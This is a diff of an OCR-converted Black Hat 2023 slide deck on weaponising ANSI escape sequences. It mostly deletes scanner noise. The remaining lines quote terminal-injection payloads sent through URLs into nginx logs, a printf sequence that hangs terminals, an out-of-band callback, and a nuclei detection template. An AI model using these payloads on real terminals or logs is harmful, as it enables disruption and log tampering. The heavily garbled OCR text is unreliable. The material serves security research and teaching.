@@ -21,7 +21,6 @@ converted_at: "2026-08-11T21:26:59Z"
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/STOK_Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare.pdf` (150 pages)
 
-
 ## Slide 1
 
 **STÖK**
@@ -95,7 +94,6 @@ Command Prompt Ctri+Shift+2
 Me AureCloud Shell ——_crtastunss T E R M | N Al AP Pp
 %8 Settings Ctrl+, e
 Command Palette Curl+sie-?
-Q pam parallels@ubuntu-linux-22-04-desktop:~ - QO x
 WINDOWS
 TERMINAL GNOME VTE
 Bubuntu-] ine
@@ -164,7 +162,6 @@ and is always zero.
 CSI Psd Line Position Absolute [row] (default = [1,column]) (VPA).
 CSI Ps e Line Position Relative [rows] (default = [rowt+1,column])
 CVPR).
-CSI Ps ; Ps f
 Horizontal and Vertical Position [row;column] (default
 [1,1]) CHVP).
 Tab Clear (TBC). ECMA-48 defines additional codes, but the
@@ -718,7 +715,6 @@ PS C:\Users\stok> write-host "$([char]0x1b) $C[cha
 PS C:\Users\stok>
 2003 - H D MOORE
 Sun
-x + vv
 tdetetetedteatete te teteaeaet
 https://marc.info/?l=bugtraq&m=104612710031920&q=p3
 Description
@@ -1038,7 +1034,6 @@ March 2022
 Fallow @code
 February 2022 Request features
 January 2022 Report issues
-Oe €h 7
 Watch videos
 November 2021
 October 2021
@@ -1270,7 +1265,6 @@ Payloads tog... | 1
 2023-Jul-13 13:20:00,588 UTC
 2023-Jul-13 13:20:00.588 UTC
 2023-Jul-13 13:20:00.968 UTC
-On ons on —
 Description Request to Collaborator
 Raw Hex
 1 GET /Lwo= HTTP/1.1
@@ -1308,13 +1302,11 @@ Source |
 188.126,80.54
 188.126.80.54
 188. 126.80.54
-mm > => & xX
 Request attributes 2 vi
 root.2e0348d7 fed4. rcepoc. idz9guqceiehzubwq7v9rp3ck3quek29. oast
 ify.com
 3 User-Agent: curl/7.86.6
 4 Accept: */*
-5 DNT: 1
 (OKC € > Search...
 ZeUs48a/Tea4 iL
 Inspect Terminal Files
@@ -1365,7 +1357,6 @@ docker/getting-started STATUS
 (A Dev Environments (BETA "failed (2:_No such file or directory), client: _172.17.9.1,_server:_ localhost, request: "GET /tutorial/ Qneg b
 Tid. bRSb2INO7HADASbHMADMSD2INO7_ HITE 0 G
 2 Learning Center
-. e '
 Extensions 5
 wy Resource usage
 © seeseners CLEARS THE LOG EVERY TIME IT RENDERS
@@ -1424,7 +1415,6 @@ Ps @ = Normal Linefeed (LNM).
 4
 1
 2
-CSI ? Pm Ll
 DEC Private Mode Reset (DECRST).
 Ps = Normal Cursor Keys (DECCKM), VT10@.
 Ps Designate VT52 mode (DECANM), VT1@@.
@@ -1540,9 +1530,6 @@ CSI 7 ; @c (C"VT101 with No Options")
 CST 7 ; 6 c ("VT132 with Advanced Video and Graphics")
 CSI 7 ("VT102")
 CSI ("VT131")
-CSI 7 ; Ps cc ("VT125")
-CSI 7 ; Ps c (C"VT220")
-CSI 7 ; Ps c ("VT320")
 ```
 
 ## Slide 102
@@ -1630,7 +1617,6 @@ affectionate_chandrasekhar
 SB Dev Environments | BETA
 @_ Learning Center
 4
-. ® °
 Extensions =
 wy Resource usage
 @) Add Extensions
@@ -1651,7 +1637,6 @@ wy Resource usage
 @ Images 80:80 @
 @ Volumes Logs Inspect Terminal Files Stats external terminal @
 —) Dev Environments (BETA
-/# Q 0 &
 @D_Learning Center / # printf '@e33[1900000000;b\007'
 a
 e .
@@ -1664,7 +1649,6 @@ PROBLEMS OUTPUT
 RAM 4.16 GB Disk 47.53 GB avail. of 58.37 GB Not connected to Hub |
 Je) > «~ printf '#\@33[1000000000;b\007'
 a]
-: ' sia ~ / : ~ | 3
 o 2\xielV bin|m a
 BRICKED
 TRY IT YOURSELF AT https://evil.ter
@@ -1704,7 +1688,6 @@ https://www.youtube.com/watch?v=ilHwOKWgzAs
 
 ```text
 DAVID LEADBEATER
-= C © 6 https://github.com/dgl/houdini-kubectl-poc As
 = README.md
 CVEs
 This primarily targets Kubectl's CVE-2021-25743. It needs to be combined with a terminal vulnerability to
@@ -1802,7 +1785,6 @@ e . Kit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
 Extensions
 iP Resource usage
 x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
-+. * Gay
 a of
 STATUS
 Running (4 minutes ago)
@@ -1833,7 +1815,6 @@ BAhti_.Carntainar Annc
 "“Mozilla/
 220348d7 fed4a5176 f5c6543b0b2582a9d5d8db4afeb42808cd16f61197d0eb1 |
 (Windows
-4; x64) A
 WebKit/53
 iTerm2
 $ By George Nachman and Contributors
@@ -1873,7 +1854,6 @@ Docker Desktop —_ Update to latest Q Search for local and remote images, conta
 affectionate-chandrasekhar
 Containers STATUS
 Running (54 minutes ago)
-< @ < r
 2e0348d7fed4
 Images
 Volumes Inspect Terminal
@@ -1904,7 +1884,6 @@ b
 {favicon.ico HTTP/1.1" 404 555 "http://localhost/sup%0a%1B%5B31mESC- INJECTION- SUCCESSFUL - LETS - POP-CALC%1B%5B0m%07%0a%1bP%24qm%03%1b
 %1bP%24am%1b%S5c"_"Mozilla/S.@ (Windows NT 10.0: Win64: x64) AnpleWebKit/537.36 (KHTML. Like Gecko) Chrome/114.0.5735.199 Safari/537
 @ 404 Not Found x +
-ee RAM 5.54GB CPU 1.0 1 2 MN € “ © localhost/sup%0a%18%5B31mESC-INJECTION-SUCCESSFUL-LETS-POP-CALC%18%5B0m%07%0a%1bP%24qm%03%1b%5c%1bP%24qm%3... E
 2023/07/10 09:31:04 Lerror] 22#22: *102 open{) “/usr/share/n
 ESC-INJECTIGN-SUCCESSFUL-LETS-POP-CALC
 " failed (2: No such file or directory), client: 172.17.0.1,
@@ -2138,7 +2117,6 @@ zsh: command not found: 5113
 
 ```text
 TERMINALINJECTION.COM
-<¢< > G & view-source:https://evil.terminalinjection.com/ Ww
 6 * LAY Le2m*cl*) L3a2m Je
 7 “|]1337;ClearScrollback#
 8 *)[33m4
@@ -2401,12 +2379,9 @@ Server: nginx/1.23.3
 
 ```text
 id: Terminal—injection-poc
-T c O
 Examp pres ation at Bla nd DEF
 ec
 i
-B E LE B% S$
-1 T E: mS ug
 part: body
 words:
 — ':\u@01b[32mSUCCESSFUL\uQ01b [0m\ud007 '
